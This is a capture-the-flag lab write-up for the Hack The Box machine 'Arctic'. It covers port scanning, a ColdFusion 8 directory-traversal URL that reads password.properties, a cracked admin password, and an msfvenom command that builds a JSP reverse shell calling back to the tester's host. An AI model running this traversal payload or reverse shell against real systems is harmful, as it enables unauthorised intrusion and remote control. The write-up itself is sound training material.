---
description: 10.10.10.11
---

# Arctic

## Nmap

```
sudo nmap -Pn -p- 10.10.10.11 --min-rate=5000
```

![](<../../../../.gitbook/assets/image (8) (1).png>)

Ran a script script based on open ports

{% code overflow="wrap" %}
```bash
# Nmap 7.92 scan initiated Wed Aug 10 16:56:59 2022 as: nmap -Pn -p135,8500,49154 -sCV -O -v -oN script-scan.txt 10.10.10.11
Nmap scan report for arctic.htb (10.10.10.11)
Host is up (0.040s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.009 days (since Wed Aug 10 16:46:55 2022)
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 10 16:59:18 2022 -- 1 IP address (1 host up) scanned in 139.14 seconds
```
{% endcode %}

## FMTP Port 8500

{% embed url="https://www.eurocontrol.int/service/flight-message-transfer-protocol-address-coordination" %}

> Flight Message Transfer Protocol (FMTP) is a communication stack based on the transmission control and internet protocols (TCP/IP). It is used in a peer-to-peer communication context for the information exchange between flight data processing systems for the purpose of notification, coordination and transfer of flights between air traffic control units and for the purposes of civil-military cooperation.

I look to see if there's anything interesting that can be looked at on the browser on this particular port

![](<../../../../.gitbook/assets/image (5) (1).png>)

Clicking on `CFIDE` leads to some pretty interesting findings

![](<../../../../.gitbook/assets/image (11) (1).png>)

I'm most interested in the `administrator` link, so going there takes me to an Admin page!

![](<../../../../.gitbook/assets/image (7) (1).png>)

## Searchsploit

I search for any public exploits in searchsploit

![](<../../../../.gitbook/assets/image (9) (1).png>)

The Remote Code Execution python script catches my eye so I'll view that one

![](<../../../../.gitbook/assets/image (6) (1).png>)

{% embed url="https://www.exploit-db.com/exploits/50057" %}

{% embed url="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2265" %}

> Multiple directory traversal vulnerabilities in FCKeditor before 2.6.4.1 allow remote attackers to create executable files in arbitrary directories via directory traversal sequences in the input to unspecified connector modules, as exploited in the wild for remote code execution in July 2009, related to the file browser and the editor/filemanager/connectors/ directory.

## Foothold #1 - RCE Script

This python script does it all! We'll change the listening host IP and port number (in case firewall rules don't like weird port numbers)&#x20;

Then we run it and get a shell!

![](<../../../../.gitbook/assets/image (2) (1).png>)

## Foothold #2 - Directory Traversal

There was also a metasploit module for directory traversal. I was curious about it so I checked it out and found this

{% embed url="https://www.exploit-db.com/exploits/14641" %}

![](<../../../../.gitbook/assets/image (4) (1).png>)

I decided to do this without the python script since you technically don't need to

{% code overflow="wrap" %}
```
http://arctic.htb:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```
{% endcode %}

As you can see, there's a password that's encrypted, so we should crack it.

### Cracking the hash

![](<../../../../.gitbook/assets/image (18) (2).png>)

```
happyday
```

&#x20;Because we have a password, we can log in!

![](<../../../../.gitbook/assets/image (15).png>)

### Getting a shell

This is an excellent resource I found that could assist with getting a reverse shell

{% embed url="https://pentest.tonyng.net/attacking-adobe-coldfusion/" %}

Generate our payload with  msfvenom

{% code overflow="wrap" %}
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f raw > revshell.jsp
```
{% endcode %}

Schedule a New Task

![](<../../../../.gitbook/assets/image (10).png>)

Make sure to save the output to a file in a valid directory. I had to check for what it was on google

[https://help.adobe.com/archive/en\_US/coldfusion/8/cf8\_install.pdf](https://help.adobe.com/archive/en\_US/coldfusion/8/cf8\_install.pdf)

![](<../../../../.gitbook/assets/image (8).png>)

Before you run the scheduled task, make sure to have a web server (I use python) running so it will download your payload

![](<../../../../.gitbook/assets/image (4).png>)

![](<../../../../.gitbook/assets/image (1) (1).png>)

![](<../../../../.gitbook/assets/image (7).png>)

Now start your listener and go to the file in your web browser to catch a shell!

![](<../../../../.gitbook/assets/image (12).png>)

## Priv Esc

### SystemInfo

![](<../../../../.gitbook/assets/image (14).png>)

```
OS Name:                   Microsoft Windows Server 2008 R2 Standard
OS Version:                6.1.7600 N/A Build 7600
System Type:               x64-based PC
```

### whoami /all

![](<../../../../.gitbook/assets/image (16).png>)



## Windows Exploit Suggester

![](<../../../../.gitbook/assets/image (3) (3).png>)

{% embed url="https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled" %}

I've seen online people using this, however I cannot get it work

## Resources

[https://help.adobe.com/archive/en\_US/coldfusion/8/cf8\_install.pdf](https://help.adobe.com/archive/en\_US/coldfusion/8/cf8\_install.pdf)

